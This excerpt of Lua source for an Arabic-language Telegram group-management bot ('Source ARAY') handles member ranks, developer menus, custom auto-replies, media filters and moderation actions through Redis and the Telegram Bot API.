DevRio:sadd(ARAY..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(ARAY..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sxj3z')..')'..' ❩\n↯︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(ARAY..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sxj3z')..')'..' ❩\n↯︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(ARAY..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'sxj3z')..')'..' ❩\n↯︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevRio:sismember(ARAY.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(ARAY.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(ARAY..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(ARAY..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(ARAY..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:srem(ARAY..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(ARAY..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(ARAY..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(ARAY.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'sxj3z')..')'..' ❩\n↯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:incr(ARAY..'Rio:UsersMsgs'..ARAY..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(ARAY..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(ARAY.."Rio:Users",msg.chat_id_) then
DevRio:sadd(ARAY.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
...
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه بتحديث  سورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ᥀','↫ تحديث ᥀'},
{'↫ السيرفر ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه ب أحصائيات  سورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ᥀'},
{'↫ المشتركين ᥀','↫ المجموعات ᥀'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه ب المطورين لسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه بالاذاعه لسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ᥀'},
{'↫ اذاعه خاص ᥀','↫ اذاعه عام ᥀'},
...
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه بالعام لسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه بردود الخاص لسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي المطور \n↯︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي \n↯︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي \n↯︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ᥀','↫ اغنيه ᥀'},
{'↫ ميمز ᥀','↫ ريمكس ᥀'},
{'↫ صوره ᥀','↫ متحركه ᥀'},
...
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي \n↯︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي \n↯︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس روتانا فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
...
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '↯︙اهلا بك مجددا عزيزي \n↯︙اليك الازرار الخاصه بألعاب سورس روتانا فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
...
if not DevRio:get(ARAY..'Rio:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {
{{text="᥀ المطور .",url="t.me/"..(dp.username_ or "sxj3z")}},
{{text="᥀ السورس .",url="https://t.me/sxj3z"},{text="᥀ لتنصيب بوت .",url="https://t.me/BH_U1"}},{{text="᥀ اضفني في مجموعتك .",url="t.me/"..dp.username_.."?startgroup=botstart"}}
}
local start = DevRio:get(ARAY.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevRio:setex(ARAY..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source ARAY     --
if not SecondSudo(msg) and not DevRio:sismember(ARAY..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(ARAY..'Rio:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '↯︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "sxj3z")..')', 1, 'md') 
...
DevRio:sadd(ARAY..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '↯︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n↯︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(ARAY..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source ARAY     --
if text and DevRio:get(ARAY..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevRio:del(ARAY..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(ARAY.."Rio:Start:Bot",text)  
...
DevRio:set(ARAY..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تفعيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Texting:Pv',true) 
end
if Sudo(msg) then
...
DevRio:del(ARAY.."Rio:Lock:AutoFile")
end
...
DevRio:set(ARAY.."Rio:Lock:AutoFile",true) 
end
end
end
--     Source ARAY     --
...
local ARAYTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..ARAYTeam[math.random(#ARAYTeam)]..'' , 1, 'md')  
return false
end
--     Source ARAY     --
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or sxj3z}}}
...
local my_ph = DevRio:get(ARAY.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevRio:get(ARAY..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
...
DevRio:incr(ARAY..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(ARAY.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevRio:get(ARAY.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevRio:sadd(ARAY..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(ARAY) then 
DevRio:srem(ARAY.."Rio:Groups", msg.chat_id_) 
...
if DevRio:get(ARAY..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevRio:incr(ARAY..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevRio:incr(ARAY..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source ARAY     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevRio:get(ARAY..'Rio:Lock:FreeBot'..ARAY) then
if ChatType == 'pv' then
...
DevRio:sadd(ARAY..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(ARAY..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevRio:sadd(ARAY..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevRio:sadd(ARAY.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(ARAY.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(ARAY.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(ARAY.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(ARAY..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevRio:get(ARAY..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙عدد اعضاء المجموعه اقل من ↫ *'..(DevRio:get(ARAY..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","↯︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(ARAY.."Rio:Groups",msg.chat_id_)
DevRio:sadd(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevRio:set(ARAY.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevRio:set(ARAY..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source ARAY     --
local ReFalse = tostring(msg.chat_id_)
if not DevRio:sismember(ARAY.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevRio:get(ARAY..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(ARAY..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevRio:get(ARAY.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevRio:smembers(ARAY.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevRio:smembers(ARAY.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevRio:smembers(ARAY.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevRio:get(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevRio:get(ARAY..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevRio:del(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(ARAY..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevRio:srem(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:srem(ARAY..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevRio:get(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(ARAY.."Rio:Gif:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Voice:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Audio:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Photo:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Stecker:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Video:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:File:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Text:AllRed"..msg.content_.text_)
DevRio:del(ARAY.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source ARAY     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevRio:get(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevRio:get(ARAY..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(ARAY..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙↯︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevRio:del(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevRio:del(ARAY..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(ARAY..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevRio:get(ARAY..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(ARAY..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local ARAYTeam =  DevRio:smembers(ARAY..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..ARAYTeam[math.random(#ARAYTeam)]..']' , 1, 'md')  
end
end
--     Source ARAY     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevRio:get(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevRio:get(ARAY..'DelManagerRep'..msg.chat_id_)
DevRio:srem(ARAY..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(ARAY..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(ARAY..'DelManagerRep'..msg.chat_id_)
return false
end
DevRio:del(ARAY..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevRio:get(ARAY..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevRio:set(ARAY..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevRio:set(ARAY..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevRio:set(ARAY..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevRio:set(ARAY..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevRio:set(ARAY..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevRio:set(ARAY..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevRio:set(ARAY..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevRio:set(ARAY..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevRio:get(ARAY..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevRio:get(ARAY..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(ARAY..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(ARAY..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(ARAY..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(ARAY..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(ARAY..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(ARAY..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(ARAY..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(ARAY..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(ARAY..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(ARAY..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevRio:get(ARAY..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function ARAYTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(ARAY..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(ARAY..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
getUser(msg.sender_user_id_, ARAYTeam)
end
end
--     Source ARAY     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevRio:get(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevRio:get(ARAY..'DelSudoRep')
DevRio:del(ARAY.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(ARAY.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(ARAY.."DelSudoRep")
return false
end
DevRio:del(ARAY.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevRio:get(ARAY.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevRio:set(ARAY.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevRio:set(ARAY.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevRio:set(ARAY.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevRio:set(ARAY.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevRio:set(ARAY.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevRio:set(ARAY.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
